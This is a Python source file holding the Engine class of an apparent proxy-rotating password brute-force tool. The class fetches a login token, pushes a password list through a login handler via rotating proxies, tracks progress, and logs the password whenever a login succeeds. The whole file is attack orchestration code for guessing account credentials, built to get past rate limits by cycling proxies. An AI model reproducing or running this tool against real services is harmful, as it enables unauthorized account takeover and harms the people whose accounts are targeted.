from __future__ import absolute_import

import sys

import asyncio

from app.lib import exceptions
from app.logging import AppLogger

from .handlers import login_handler, token_handler
from .proxies import proxy_handler


__all__ = ('Engine', )


log = AppLogger('Engine')


class Engine(object):

    def __init__(self, config, proxies):

        self.config = config

        self.proxy_handler = proxy_handler(config, proxies)
        self.login_handler = login_handler(config, self.proxy_handler)
        self.token_handler = token_handler(config, self.proxy_handler)

        self.consumers = []
        self.total = None

    async def slowdown(self):
        log.info(f'Shutting Down {len(self.consumers)} Consumers...')
        for consumer in self.consumers:
            consumer.cancel()

    async def shutdown(self, loop, attempts, forced=False, signal=None):
        log.info("Shutting Down...")

        # We have to do this for now for when we find a successful login,
        # otherwise we hit an error in run.py about the loop being closed
        # before all futures finished - being caused by the proxy_broker.
        if forced:
            await self.dump_attempts(attempts)
            sys.exit()

        if signal:
            log.info(f'Received exit signal {signal.name}...')

        tasks = [task for task in asyncio.Task.all_tasks() if task is not
             asyncio.tasks.Task.current_task()]

        list(map(lambda task: task.cancel(), tasks))
        await asyncio.gather(*tasks, return_exceptions=True)
        log.info('Finished awaiting cancelled tasks, results.')

        await self.dump_attempts(attempts)
        loop.stop()

    async def consume_results(self, loop, results, attempts):
        log = AppLogger('Consuming Results')

        index = 0
        while True:
            # wait for an item from the producer
            result = await results.get()
            if not result or not result.conclusive:
                raise exceptions.FatalException(
                    "Result should be valid and conslusive."
                )

            index += 1
            log.notice("{0:.2%}".format(float(index) / self.config.user.num_passwords))

            if result.authorized:
                log.notice(result)
                log.notice(result.context.password)
                return await self.shutdown(loop, attempts, forced=True)
            else:
                log.error(result)

            await attempts.put(result.context.password)

            # Notify the queue that the item has been processed
            results.task_done()

    async def dump_attempts(self, attempts):
        log.info('Dumping Attempts')
        attempts_list = []
        while not attempts.empty():
            attempts_list.append(await attempts.get())
        self.config.user.update_password_attempts(attempts_list)

    async def run(self, loop, attempts, results):

        proxy_producer = asyncio.ensure_future(
            self.proxy_handler.produce_proxies()
        )

        token = await self.token_handler.fetch()
        if token is None:
            raise exceptions.FatalException(
                "The allowable attempts to retrieve a token did not result in a "
                "valid response containing a token.  This is most likely do to "
                "a connection error."
            )

        log.notice("Set Token", extra={'token': token})

        results_consumer = asyncio.ensure_future(
            self.consume_results(loop, results, attempts)
        )

        password_consumer = asyncio.ensure_future(
            self.login_handler.consume_passwords(loop, results, token)
        )

        self.consumers = [password_consumer, results_consumer, proxy_producer]

        # Wait until the password consumer has processed all the passwords.
        log.debug('Awaiting Password Consumer')

        # TODO: Maybe try to add signals here for keyboard interrupt as well.
        # await password_consumer
        try:
            await password_consumer
        except Exception as e:
            log.critical("Uncaught Exception")
            log.exception(e)
            # Having trouble calling this outside of run.py without having issues
            # closing the loop with ongoing tasks.  So we force.
            return await self.shutdown(loop, attempts, forced=True)
        except KeyboardInterrupt:
            log.critical('Keyboard Interrupt')
            return await self.shutdown(loop, attempts, forced=True)
        else:
            log.notice('Passwords Consumed')
            return await self.slowdown()
